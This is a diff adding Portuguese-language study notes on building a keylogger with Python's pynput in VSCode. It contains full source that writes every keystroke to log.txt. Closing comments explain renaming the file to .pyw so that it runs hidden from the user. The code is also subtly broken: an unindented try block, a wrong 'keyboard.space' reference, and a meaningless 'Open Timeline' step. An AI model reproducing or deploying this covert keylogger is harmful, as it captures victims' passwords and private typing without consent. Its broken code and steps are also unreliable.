@@ -1,0 +1,57 @@
+### listas de procedimentos/comandos usados:
+
+@@@@ pip install pynput no terminal VSCode;
+
+@@@@ Criar pasta KEYLOGGER no VSCode
+
+@@@@ criar arquivo python keylogger.py, dentro da pasta KEYLOGGER no VSCode
+
+@@@@ digitar código no arquivo python keylogger.py:
+
+
+from pynput import keyboard
+
+# define teclas que não devem ser processadas
+IGNORAR = {
+    keyboard.Key.shift,
+    keyboard.Key.shift_r,
+    keyboard.Key.ctrl_l,
+    keyboard.Key.alt_l,
+    keyboard.Key.alt_r,
+    keyboard.Key.caps_lock,
+    keyboard.Key.cmd
+}
+
+# on_press é chamada toda vez que uma tecla é detectada.
+def on_press(key):
+    try:
+    # se for uma tecla "normal" (letra, numero, simbolo)    
+    with open("log.txt", "a", encoding="utf-8") as f:
+        f.write(key.char)
+
+# trata diferenciação entre: teclas “normais” (com caractere, como letras e números), teclas especiais (enter, tab, esc etc.)
+    except AttributeError:
+        with open("log.txt", "a", encoding="utf-8") as f:
+            if key == keyboard.space:
+                f.write(" ")
+            elif key == keyboard.Key.enter:
+                f.write("\n")
+            elif key == keyboard.Key.tab:
+                f.write("\t")
+            elif key == keyboard.Key.backspace:
+                f.write(" ")
+            elif key == keyboard.Key.esc:
+                f.write(" [ESC] ")
+            elif key in IGNORAR:
+                pass
+            else:
+                f.write(f" [{key}] ")
+                
+# Um listener (ouvinte) é criado para reagir quando uma tecla é pressionada                
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
+
+# digitar no terminal do VSCode comando python .\keylogger.py para rodar arquivo keylogger.py;
+# digitar no terminal do VSCode comando ren .\keylogger.py .\keylogger.pyw, para tornar invisivel keylogger para usuario;
+# digitar no terminal do VSCode comando Open Timeline (continuacao tornar keylogger invisivel...);
+# digitar no terminal do VSCode comando python .\keylogger.pyw (continuacao  tornar keylogger invisivel..);
